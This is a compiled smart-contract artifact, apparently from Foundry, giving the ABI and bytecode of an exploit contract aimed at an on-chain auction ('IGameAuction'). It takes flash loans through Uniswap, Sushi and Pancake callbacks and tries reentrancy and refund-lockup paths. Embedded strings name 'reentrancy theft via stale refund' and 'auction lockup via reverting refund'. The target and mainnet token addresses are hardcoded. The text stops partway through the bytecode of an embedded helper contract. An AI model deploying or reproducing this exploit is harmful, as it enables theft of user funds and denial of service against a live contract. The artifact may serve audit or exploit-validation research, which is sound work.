{"abi":[{"type":"constructor","inputs":[],"stateMutability":"payable"},{"type":"receive","stateMutability":"payable"},{"type":"function","name":"TARGET","inputs":[],"outputs":[{"name":"","type":"address","internalType":"contract IGameAuction"}],"stateMutability":"view"},{"type":"function","name":"executeOnOpportunity","inputs":[],"outputs":[],"stateMutability":"payable"},{"type":"function","name":"exploitPathUsed","inputs":[],"outputs":[{"name":"","type":"string","internalType":"string"}],"stateMutability":"view"},{"type":"function","name":"lockupPathExecuted","inputs":[],"outputs":[{"name":"","type":"bool","internalType":"bool"}],"stateMutability":"view"},{"type":"function","name":"originalHypothesisRefuted","inputs":[],"outputs":[{"name":"","type":"bool","internalType":"bool"}],"stateMutability":"view"},{"type":"function","name":"originalHypothesisValidated","inputs":[],"outputs":[{"name":"","type":"bool","internalType":"bool"}],"stateMutability":"view"},{"type":"function","name":"pancakeCall","inputs":[{"name":"sender","type":"address","internalType":"address"},{"name":"amount0","type":"uint256","internalType":"uint256"},{"name":"amount1","type":"uint256","internalType":"uint256"},{"name":"","type":"bytes","internalType":"bytes"}],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"profitAchieved","inputs":[],"outputs":[{"name":"","type":"bool","internalType":"bool"}],"stateMutability":"view"},{"type":"function","name":"profitAmount","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"profitToken","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"},{"type":"function","name":"reentrancyPathExecuted","inputs":[],"outputs":[{"name":"","type":"bool","internalType":"bool"}],"stateMutability":"view"},{"type":"function","name":"reentrancyPathProfitable","inputs":[],"outputs":[{"name":"","type":"bool","internalType":"bool"}],"stateMutability":"view"},{"type":"function","name":"sushiCall","inputs":[{"name":"sender","type":"address","internalType":"address"},{"name":"amount0","type":"uint256","internalType":"uint256"},{"name":"amount1","type":"uint256","internalType":"uint256"},{"name":"","type":"bytes","internalType":"bytes"}],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"uniswapV2Call","inputs":[{"name":"sender","type":"address","internalType":"address"},{"name":"amount0","type":"uint256","internalType":"uint256"},{"name":"amount1","type":"uint256","internalType":"uint256"},{"name":"","type":"bytes","internalType":"bytes"}],"outputs":[],"stateMutability":"nonpayable"}],"bytecode":{"object":"0x60e06040527352d69c67536f55efefe02941868e5e762538dbd630604051610026906101b6565b610031929190610277565b604051809103905ff08015801561004a573d5f5f3e3d5ffd5b5073ffffffffffffffffffffffffffffffffffffffff1660808173ffffffffffffffffffffffffffffffffffffffff16815250507352d69c67536f55efefe02941868e5e762538dbd6306040516100a0906101c3565b6100ab929190610277565b604051809103905ff0801580156100c4573d5f5f3e3d5ffd5b5073ffffffffffffffffffffffffffffffffffffffff1660a08173ffffffffffffffffffffffffffffffffffffffff16815250507352d69c67536f55efefe02941868e5e762538dbd63060405161011a906101d0565b610125929190610277565b604051809103905ff08015801561013e573d5f5f3e3d5ffd5b5073ffffffffffffffffffffffffffffffffffffffff1660c08173ffffffffffffffffffffffffffffffffffffffff16815250505f5f5f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555061029e565b610966806137ed83390190565b61053c8061415383390190565b6109e48061468f83390190565b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f819050919050565b5f61021f61021a610215846101dd565b6101fc565b6101dd565b9050919050565b5f61023082610205565b9050919050565b5f61024182610226565b9050919050565b61025181610237565b82525050565b5f610261826101dd565b9050919050565b61027181610257565b82525050565b5f60408201905061028a5f830185610248565b6102976020830184610268565b9392505050565b60805160a05160c0516134fb6102f25f395f818161137601528181611417015281816118ea0152611aed01525f61112b01525f81816116400152818161185e015281816119e80152611a7201526134fb5ff3fe6080604052600436106100df575f3560e01c8063848008121161007e578063cc1f2afa11610058578063cc1f2afa14610268578063d723a32214610292578063d78c4281146102bc578063f0a01176146102e6576100e6565b806384800812146101ec5780639159ade2146102145780639359d6cd1461023e576100e6565b80633c2448ed116100ba5780633c2448ed14610164578063493436241461016e5780635ff972cc1461019857806373e3b75b146101c2576100e6565b8062991403146100ea57806310d1e85c146101125780632d0455b51461013a576100e6565b366100e657005b5f5ffd5b3480156100f5575f5ffd5b50610110600480360381019061010b9190612685565b610310565b005b34801561011d575f5ffd5b5061013860048036038101906101339190612685565b610322565b005b348015610145575f5ffd5b5061014e610334565b60405161015b9190612723565b60405180910390f35b61016c610347565b005b348015610179575f5ffd5b506101826105f2565b60405161018f919061274b565b60405180910390f35b3480156101a3575f5ffd5b506101ac610619565b6040516101b99190612773565b60405180910390f35b3480156101cd575f5ffd5b506101d6610622565b6040516101e39190612723565b60405180910390f35b3480156101f7575f5ffd5b50610212600480360381019061020d9190612685565b610635565b005b34801561021f575f5ffd5b50610228610647565b6040516102359190612723565b60405180910390f35b348015610249575f5ffd5b50610252610659565b60405161025f9190612723565b60405180910390f35b348015610273575f5ffd5b5061027c61066c565b60405161028991906127e7565b60405180910390f35b34801561029d575f5ffd5b506102a6610684565b6040516102b39190612723565b60405180910390f35b3480156102c7575f5ffd5b506102d0610697565b6040516102dd9190612870565b60405180910390f35b3480156102f1575f5ffd5b506102fa610723565b6040516103079190612723565b60405180910390f35b61031b858585610734565b5050505050565b61032d858585610734565b5050505050565b600260049054906101000a900460ff1681565b5f344761035491906128bd565b90507352d69c67536f55efefe02941868e5e762538dbd673ffffffffffffffffffffffffffffffffffffffff166318916f9b6040518163ffffffff1660e01b8152600401602060405180830381865afa1580156103b3573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906103d7919061291a565b156103fd576001600260016101000a81548160ff021916908315150217905550506105f0565b5f5f905060017352d69c67536f55efefe02941868e5e762538dbd673ffffffffffffffffffffffffffffffffffffffff166397d54cf76040518163ffffffff1660e01b8152600401602060405180830381865afa158015610460573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906104849190612959565b61048e9190612984565b47106104a45761049d82610b95565b90506104b0565b6104ad82610c75565b90505b600260059054906101000a900460ff1661059c575f8247116104d2575f6104df565b82476104de91906128bd565b5b905081158061058b575060027352d69c67536f55efefe02941868e5e762538dbd673ffffffffffffffffffffffffffffffffffffffff166397d54cf76040518163ffffffff1660e01b8152600401602060405180830381865afa158015610548573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061056c9190612959565b61057691906129b7565b66038d7ea4c680006105889190612984565b81115b1561059a57610598611002565b505b505b6105a582611522565b60028054906101000a900460ff161580156105cc575060025f9054906101000a900460ff16155b156105ed576001600260016101000a81548160ff0219169083151502179055505b50505b565b5f5f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff16905090565b5f600154905090565b600260019054906101000a900460ff1681565b610640858585610734565b5050505050565b60025f9054906101000a900460ff1681565b600260039054906101000a900460ff1681565b7352d69c67536f55efefe02941868e5e762538dbd681565b600260059054906101000a900460ff1681565b600380546106a490612a25565b80601f01602080910402602001604051908101604052809291908181526020018280546106d090612a25565b801561071b5780601f106106f25761010080835404028352916020019161071b565b820191905f5260205f20905b8154815290600101906020018083116106fe57829003601f168201915b505050505081565b60028054906101000a900460ff1681565b60045f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16146107c3576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016107ba90612a9f565b60405180910390fd5b3073ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff1614610831576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161082890612b07565b60405180910390fd5b5f5f830361083f5781610841565b825b90505f60066040518060c00160405290815f82015481526020016001820154815260200160028201548152602001600382015481526020016004820154815260200160058201548152505090508060a0015182146108d4576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016108cb90612b6f565b60405180910390fd5b60055f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d836040518263ffffffff1660e01b815260040161092e9190612773565b5f604051808303815f87803b158015610945575f5ffd5b505af1158015610957573d5f5f3e3d5ffd5b505050505f61097882602001518360400151846060015185608001516115b8565b9050806109ba576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016109b190612bd7565b60405180910390fd5b5f6109c88360a00151611bf9565b905080471015610a0d576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610a0490612c3f565b60405180910390fd5b60055f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d0e30db0826040518263ffffffff1660e01b81526004015f604051808303818588803b158015610a74575f5ffd5b505af1158015610a86573d5f5f3e3d5ffd5b50505050505f60055f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a9059cbb60045f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff16846040518363ffffffff1660e01b8152600401610b09929190612c5d565b6020604051808303815f875af1158015610b25573d5f5f3e3d5ffd5b505050506040513d601f19601f82011682018060405250810190610b49919061291a565b905080610b8b576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610b8290612cce565b60405180910390fd5b5050505050505050565b5f5f610b9f611c15565b90508060c001511580610bc357508060400151815f0151610bc09190612984565b47105b15610bd1575f915050610c70565b5f610bed825f01518360200151846040015185606001516115b8565b905080610bfe575f92505050610c70565b83471115610c6a576001600260046101000a81548160ff0219169083151502179055505f60038054610c2f90612a25565b905003610c5f5760405180606001604052806021815260200161347c6021913960039081610c5d9190612eb0565b505b600192505050610c70565b5f925050505b919050565b5f5f610c7f611c15565b90508060c00151610c93575f915050610ffd565b5f5f5f5f610ca48560800151611ebb565b93509350935093505f73ffffffffffffffffffffffffffffffffffffffff168473ffffffffffffffffffffffffffffffffffffffff1603610cec575f95505050505050610ffd565b8360045f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055508260055f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055506040518060c00160405280888152602001865f01518152602001866020015181526020018660400151815260200186606001518152602001866080015181525060065f820151815f01556020820151816001015560408201518160020155606082015181600301556080820151816004015560a082015181600501559050505f8473ffffffffffffffffffffffffffffffffffffffff1663022c0d9f60e01b848430604051602401610e2093929190612fc9565b604051602081830303815290604052907bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff8381831617835250505050604051610e8a9190613055565b5f604051808303815f865af19150503d805f8114610ec3576040519150601f19603f3d011682016040523d82523d5f602084013e610ec8565b606091505b5050905060065f5f82015f9055600182015f9055600282015f9055600382015f9055600482015f9055600582015f905550505f60045f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505f60055f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550808015610f8657508747115b15610ff3576001600260046101000a81548160ff0219169083151502179055505f60038054610fb490612a25565b905003610fe45760405180606001604052806021815260200161347c6021913960039081610fe29190612eb0565b505b60019650505050505050610ffd565b5f96505050505050505b919050565b5f5f60017352d69c67536f55efefe02941868e5e762538dbd673ffffffffffffffffffffffffffffffffffffffff166397d54cf76040518163ffffffff1660e01b8152600401602060405180830381865afa158015611063573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906110879190612959565b6110919190612984565b9050804710156110a4575f91505061151f565b5f7352d69c67536f55efefe02941868e5e762538dbd673ffffffffffffffffffffffffffffffffffffffff16632f57fbf06040518163ffffffff1660e01b8152600401602060405180830381865afa158015611102573d5f5f3e3d5ffd5b505050506040513d601f19601f82011682018060405250810190611126919061307f565b90505f7f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff168363454a2ab360e01b8560405160240161117a9190612773565b604051602081830303815290604052907bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff83818316178352505050506040516111e49190613055565b5f6040518083038185875af1925050503d805f811461121e576040519150601f19603f3d011682016040523d82523d5f602084013e611223565b606091505b5050905080611353578173ffffffffffffffffffffffffffffffffffffffff167352d69c67536f55efefe02941868e5e762538dbd673ffffffffffffffffffffffffffffffffffffffff16632f57fbf06040518163ffffffff1660e01b8152600401602060405180830381865afa1580156112a0573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906112c4919061307f565b73ffffffffffffffffffffffffffffffffffffffff160361134857600160025f6101000a81548160ff0219169083151502179055506001600260056101000a81548160ff02191690831515021790555060405180606001604052806029815260200161349d602991396003908161133b9190612eb0565b506001935050505061151f565b5f935050505061151f565b5f61135d846124f3565b905080471015611373575f94505050505061151f565b5f7f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff1663687866b383846040518363ffffffff1660e01b81526004016113ce9190612773565b5f6040518083038185885af11580156113e9573d5f5f3e3d5ffd5b50505050506040513d5f823e3d601f19601f820116820180604052508101906114129190613197565b5090507f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff166335faa4166040518163ffffffff1660e01b81526004015f604051808303815f87803b15801561147a575f5ffd5b505af115801561148c573d5f5f3e3d5ffd5b5050505080611516576001600260056101000a81548160ff021916908315150217905550600160025f6101000a81548160ff0219169083151502179055505f600380546114d890612a25565b9050036115085760405180606001604052806023815260200161345960239139600390816115069190612eb0565b505b60019550505050505061151f565b5f955050505050505b90565b804711156115ad5780470360018190555060016002806101000a81548160ff0219169083151502179055505f6003805461155b90612a25565b9050036115a8576040518060400160405280600d81526020017f6469726563742070726f66697400000000000000000000000000000000000000815250600390816115a69190612eb0565b505b6115b5565b5f6001819055505b50565b5f5f7352d69c67536f55efefe02941868e5e762538dbd673ffffffffffffffffffffffffffffffffffffffff16632f57fbf06040518163ffffffff1660e01b8152600401602060405180830381865afa158015611617573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061163b919061307f565b90505f7f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff168763454a2ab360e01b8960405160240161168f9190612773565b604051602081830303815290604052907bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff83818316178352505050506040516116f99190613055565b5f6040518083038185875af1925050503d805f8114611733576040519150601f19603f3d011682016040523d82523d5f602084013e611738565b606091505b505090508061185c578173ffffffffffffffffffffffffffffffffffffffff167352d69c67536f55efefe02941868e5e762538dbd673ffffffffffffffffffffffffffffffffffffffff16632f57fbf06040518163ffffffff1660e01b8152600401602060405180830381865afa1580156117b5573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906117d9919061307f565b73ffffffffffffffffffffffffffffffffffffffff160361185257600160025f6101000a81548160ff0219169083151502179055506001600260056101000a81548160ff02191690831515021790555060405180606001604052806029815260200161349d60299139600390816118509190612eb0565b505b5f92505050611bf1565b7f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff1663ec886ff3878660016040518463ffffffff1660e01b81526004016118ba939291906131f1565b5f604051808303815f87803b1580156118d1575f5ffd5b505af11580156118e3573d5f5f3e3d5ffd5b505050505f7f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff168663454a2ab360e01b886040516024016119399190612773565b604051602081830303815290604052907bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff83818316178352505050506040516119a39190613055565b5f6040518083038185875af1925050503d805f81146119dd576040519150601f19603f3d011682016040523d82523d5f602084013e6119e2565b606091505b505090507f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff1663ec886ff35f5f5f6040518463ffffffff1660e01b8152600401611a439392919061325f565b5f604051808303815f87803b158015611a5a575f5ffd5b505af1158015611a6c573d5f5f3e3d5ffd5b505050507f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff166335faa4166040518163ffffffff1660e01b81526004015f604051808303815f87803b158015611ad5575f5ffd5b505af1158015611ae7573d5f5f3e3d5ffd5b505050507f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff166335faa4166040518163ffffffff1660e01b81526004015f604051808303815f87803b158015611b50575f5ffd5b505af1158015611b62573d5f5f3e3d5ffd5b5050505080611b76575f9350505050611bf1565b6001600260036101000a81548160ff021916908315150217905550600160025f6101000a81548160ff0219169083151502179055505f60038054611bb990612a25565b905003611be95760405180606001604052806021815260200161347c6021913960039081611be79190612eb0565b505b600193505050505b949350505050565b5f611c0382612520565b82611c0e9190612984565b9050919050565b611c1d61254e565b5f7352d69c67536f55efefe02941868e5e762538dbd673ffffffffffffffffffffffffffffffffffffffff1663c01a97456040518163ffffffff1660e01b8152600401602060405180830381865afa158015611c7b573d5f5f3e3d5ffd5b505050506040513d601f19601f82011682018060405250810190611c9f9190612959565b90505f60017352d69c67536f55efefe02941868e5e762538dbd673ffffffffffffffffffffffffffffffffffffffff166397d54cf76040518163ffffffff1660e01b8152600401602060405180830381865afa158015611d01573d5f5f3e3d5ffd5b505050506040513d601f19601f82011682018060405250810190611d259190612959565b611d2f9190612984565b90505f611d3b826124f3565b90505f7352d69c67536f55efefe02941868e5e762538dbd673ffffffffffffffffffffffffffffffffffffffff163190508183111580611d7b5750838111155b15611d895750505050611eb8565b5f8482611d9691906128bd565b90505f8385611da591906128bd565b90505f600190505b60408111611eb0575f8282611dc291906129b7565b90505f8690508085611dd49190612984565b821115611dea578482611de791906128bd565b90505b5f8189611df79190612984565b90505f828411611e07575f611e14565b8284611e1391906128bd565b5b90505f611e2083612520565b905066038d7ea4c6800081611e359190612984565b82118015611e5157508c60a001518183611e4f91906128bd565b115b15611e9a576040518060e001604052808c81526020018b81526020018581526020018781526020018481526020018284611e8b91906128bd565b8152602001600115158152509c505b505050505080611ea990613294565b9050611dad565b505050505050505b90565b5f5f5f5f5f6040518060c00160405280735c69bee701ef814a2b6a3edd4b1652cb9cc5aa6f73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001735c69bee701ef814a2b6a3edd4b1652cb9cc5aa6f73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001735c69bee701ef814a2b6a3edd4b1652cb9cc5aa6f73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200173c0aee478e3658e2610c5f7a4a2e1777ce9e4f2ac73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200173c0aee478e3658e2610c5f7a4a2e1777ce9e4f2ac73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200173c0aee478e3658e2610c5f7a4a2e1777ce9e4f2ac73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681525090505f6040518060c0016040528073a0b86991c6218b36c1d19d4a2e9eb0ce3606eb4873ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200173dac17f958d2ee523a2206206994597c13d831ec773ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001736b175474e89094c44da98b954eedeac495271d0f73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200173a0b86991c6218b36c1d19d4a2e9eb0ce3606eb4873ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200173dac17f958d2ee523a2206206994597c13d831ec773ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001736b175474e89094c44da98b954eedeac495271d0f73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815250905073c02aaa39b223fe8d0a0e5c4f27ead9083c756cc294505f5f90505b60068110156124e8575f838260068110612258576122576132db565b5b602002015173ffffffffffffffffffffffffffffffffffffffff1663e6a439058885856006811061228c5761228b6132db565b5b60200201516040518363ffffffff1660e01b81526004016122ae929190613308565b602060405180830381865afa1580156122c9573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906122ed919061307f565b90505f73ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff160361232857506124dd565b5f5f8273ffffffffffffffffffffffffffffffffffffffff16630902f1ac6040518163ffffffff1660e01b8152600401606060405180830381865afa158015612373573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061239791906133ab565b50915091505f8373ffffffffffffffffffffffffffffffffffffffff16630dfe16816040518163ffffffff1660e01b8152600401602060405180830381865afa1580156123e6573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061240a919061307f565b90505f8a73ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff161461245657826dffffffffffffffffffffffffffff16612468565b836dffffffffffffffffffffffffffff165b90506124738d612520565b8d61247e9190612984565b811161248e5750505050506124dd565b849b508a73ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff16036124cc578c99506124d0565b8c98505b50505050505050506124ec565b80600101905061223b565b5050505b9193509193565b5f6001606460058461250591906129b7565b61250f9190613428565b6125199190612984565b9050919050565b5f60016103e560038461253391906129b7565b61253d9190613428565b6125479190612984565b9050919050565b6040518060e001604052805f81526020015f81526020015f81526020015f81526020015f81526020015f81526020015f151581525090565b5f604051905090565b5f5ffd5b5f5ffd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f6125c082612597565b9050919050565b6125d0816125b6565b81146125da575f5ffd5b50565b5f813590506125eb816125c7565b92915050565b5f819050919050565b612603816125f1565b811461260d575f5ffd5b50565b5f8135905061261e816125fa565b92915050565b5f5ffd5b5f5ffd5b5f5ffd5b5f5f83601f84011261264557612644612624565b5b8235905067ffffffffffffffff81111561266257612661612628565b5b60208301915083600182028301111561267e5761267d61262c565b5b9250929050565b5f5f5f5f5f6080868803121561269e5761269d61258f565b5b5f6126ab888289016125dd565b95505060206126bc88828901612610565b94505060406126cd88828901612610565b935050606086013567ffffffffffffffff8111156126ee576126ed612593565b5b6126fa88828901612630565b92509250509295509295909350565b5f8115159050919050565b61271d81612709565b82525050565b5f6020820190506127365f830184612714565b92915050565b612745816125b6565b82525050565b5f60208201905061275e5f83018461273c565b92915050565b61276d816125f1565b82525050565b5f6020820190506127865f830184612764565b92915050565b5f819050919050565b5f6127af6127aa6127a584612597565b61278c565b612597565b9050919050565b5f6127c082612795565b9050919050565b5f6127d1826127b6565b9050919050565b6127e1816127c7565b82525050565b5f6020820190506127fa5f8301846127d8565b92915050565b5f81519050919050565b5f82825260208201905092915050565b8281835e5f83830152505050565b5f601f19601f8301169050919050565b5f61284282612800565b61284c818561280a565b935061285c81856020860161281a565b61286581612828565b840191505092915050565b5f6020820190508181035f8301526128888184612838565b905092915050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52601160045260245ffd5b5f6128c7826125f1565b91506128d2836125f1565b92508282039050818111156128ea576128e9612890565b5b92915050565b6128f981612709565b8114612903575f5ffd5b50565b5f81519050612914816128f0565b92915050565b5f6020828403121561292f5761292e61258f565b5b5f61293c84828501612906565b91505092915050565b5f81519050612953816125fa565b92915050565b5f6020828403121561296e5761296d61258f565b5b5f61297b84828501612945565b91505092915050565b5f61298e826125f1565b9150612999836125f1565b92508282019050808211156129b1576129b0612890565b5b92915050565b5f6129c1826125f1565b91506129cc836125f1565b92508282026129da816125f1565b915082820484148315176129f1576129f0612890565b5b5092915050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52602260045260245ffd5b5f6002820490506001821680612a3c57607f821691505b602082108103612a4f57612a4e6129f8565b5b50919050565b7f62616420706169720000000000000000000000000000000000000000000000005f82015250565b5f612a8960088361280a565b9150612a9482612a55565b602082019050919050565b5f6020820190508181035f830152612ab681612a7d565b9050919050565b7f6261642073656e646572000000000000000000000000000000000000000000005f82015250565b5f612af1600a8361280a565b9150612afc82612abd565b602082019050919050565b5f6020820190508181035f830152612b1e81612ae5565b9050919050565b7f626164206c6f616e0000000000000000000000000000000000000000000000005f82015250565b5f612b5960088361280a565b9150612b6482612b25565b602082019050919050565b5f6020820190508181035f830152612b8681612b4d565b9050919050565b7f7265656e7472616e63792070617468206661696c6564000000000000000000005f82015250565b5f612bc160168361280a565b9150612bcc82612b8d565b602082019050919050565b5f6020820190508181035f830152612bee81612bb5565b9050919050565b7f696e73756666696369656e7420726570617900000000000000000000000000005f82015250565b5f612c2960128361280a565b9150612c3482612bf5565b602082019050919050565b5f6020820190508181035f830152612c5681612c1d565b9050919050565b5f604082019050612c705f83018561273c565b612c7d6020830184612764565b9392505050565b7f7265706179207472616e73666572206661696c656400000000000000000000005f82015250565b5f612cb860158361280a565b9150612cc382612c84565b602082019050919050565b5f6020820190508181035f830152612ce581612cac565b9050919050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52604160045260245ffd5b5f819050815f5260205f209050919050565b5f6020601f8301049050919050565b5f82821b905092915050565b5f60088302612d757fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff82612d3a565b612d7f8683612d3a565b95508019841693508086168417925050509392505050565b5f612db1612dac612da7846125f1565b61278c565b6125f1565b9050919050565b5f819050919050565b612dca83612d97565b612dde612dd682612db8565b848454612d46565b825550505050565b5f5f905090565b612df5612de6565b612e00818484612dc1565b505050565b5b81811015612e2357612e185f82612ded565b600181019050612e06565b5050565b601f821115612e6857612e3981612d19565b612e4284612d2b565b81016020851015612e51578190505b612e65612e5d85612d2b565b830182612e05565b50505b505050565b5f82821c905092915050565b5f612e885f1984600802612e6d565b1980831691505092915050565b5f612ea08383612e79565b9150826002028217905092915050565b612eb982612800565b67ffffffffffffffff811115612ed257612ed1612cec565b5b612edc8254612a25565b612ee7828285612e27565b5f60209050601f831160018114612f18575f8415612f06578287015190505b612f108582612e95565b865550612f77565b601f198416612f2686612d19565b5f5b82811015612f4d57848901518255600182019150602085019450602081019050612f28565b86831015612f6a5784890151612f66601f891682612e79565b8355505b6001600288020188555050505b505050505050565b7f01000000000000000000000000000000000000000000000000000000000000005f82015250565b5f612fb360018361280a565b9150612fbe82612f7f565b602082019050919050565b5f608082019050612fdc5f830186612764565b612fe96020830185612764565b612ff6604083018461273c565b818103606083015261300781612fa7565b9050949350505050565b5f81519050919050565b5f81905092915050565b5f61302f82613011565b613039818561301b565b935061304981856020860161281a565b80840191505092915050565b5f6130608284613025565b915081905092915050565b5f81519050613079816125c7565b92915050565b5f602082840312156130945761309361258f565b5b5f6130a18482850161306b565b91505092915050565b5f5ffd5b6130b782612828565b810181811067ffffffffffffffff821117156130d6576130d5612cec565b5b80604052505050565b5f6130e8612586565b90506130f482826130ae565b919050565b5f67ffffffffffffffff82111561311357613112612cec565b5b61311c82612828565b9050602081019050919050565b5f61313b613136846130f9565b6130df565b905082815260208101848484011115613157576131566130aa565b5b61316284828561281a565b509392505050565b5f82601f83011261317e5761317d612624565b5b815161318e848260208601613129565b91505092915050565b5f5f604083850312156131ad576131ac61258f565b5b5f6131ba85828601612906565b925050602083015167ffffffffffffffff8111156131db576131da612593565b5b6131e78582860161316a565b9150509250929050565b5f6060820190506132045f830186612764565b6132116020830185612764565b61321e6040830184612714565b949350505050565b5f819050919050565b5f61324961324461323f84613226565b61278c565b6125f1565b9050919050565b6132598161322f565b82525050565b5f6060820190506132725f830186613250565b61327f6020830185613250565b61328c6040830184612714565b949350505050565b5f61329e826125f1565b91507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff82036132d0576132cf612890565b5b600182019050919050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52603260045260245ffd5b5f60408201905061331b5f83018561273c565b613328602083018461273c565b9392505050565b5f6dffffffffffffffffffffffffffff82169050919050565b6133518161332f565b811461335b575f5ffd5b50565b5f8151905061336c81613348565b92915050565b5f63ffffffff82169050919050565b61338a81613372565b8114613394575f5ffd5b50565b5f815190506133a581613381565b92915050565b5f5f5f606084860312156133c2576133c161258f565b5b5f6133cf8682870161335e565b93505060206133e08682870161335e565b92505060406133f186828701613397565b9150509250925092565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52601260045260245ffd5b5f613432826125f1565b915061343d836125f1565b92508261344d5761344c6133fb565b5b82820490509291505056fe61756374696f6e206c6f636b75702076696120726576657274696e6720726566756e647265656e7472616e637920746865667420766961207374616c6520726566756e646578697374696e6720696e63756d62656e7420616c726561647920626c6f636b7320726566756e6473a2646970667358221220a239665fb6185e06e6d3171332569f9ff6e4435d96fb811b629ac4989847f7b364736f6c634300081e003360c06040526040516109663803806109668339818101604052810190610025919061012d565b8173ffffffffffffffffffffffffffffffffffffffff1660808173ffffffffffffffffffffffffffffffffffffffff16815250508073ffffffffffffffffffffffffffffffffffffffff1660a08173ffffffffffffffffffffffffffffffffffffffff1681525050505061016b565b5f5ffd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f6100c182610098565b9050919050565b5f6100d2826100b7565b9050919050565b6100e2816100c8565b81146100ec575f5ffd5b50565b5f815190506100fd816100d9565b92915050565b61010c816100b7565b8114610116575f5ffd5b50565b5f8151905061012781610103565b92915050565b5f5f6040838503121561014357610142610094565b5b5f610150858286016100ef565b925050602061016185828601610119565b9150509250929050565b60805160a0516107b96101ad5f395f81816101b3015281816102420152818161030c015261045c01525f8181603e0152818160d401526103dc01526107b95ff3fe608060405260043610610037575f3560e01c806335faa416146101575780